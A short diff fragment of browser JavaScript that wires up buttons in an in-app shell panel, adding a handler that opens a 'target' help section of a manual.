       '<button class="ib" id="aeshellreset" title="Throw away every change you made in this browser and start from the app\'s files again">Discard my changes</button>' +
@@ -4396,6 +5198,8 @@ DONE      When the range shows every objective ticked: type next to take the nex
     wrap.querySelector('#aeshellreset').onclick = () => { clearOverlay(); overlay = { files: {}, removed: [], written: [], deleted: [] }; close(); open(); };
     wrap.querySelector('#aeshellreload').onclick = () => { close(); open(); };
     wrap.querySelector('#aeshellhelp').onclick = () => openManual('');
+    wrap.querySelector('#aeshelltargethelp').onclick = () => openManual('target');
+    syncTargetHelp();
     const colorInput = wrap.querySelector('#aeshellusercol');
     if (colorInput) {
       colorInput.value = userColor;
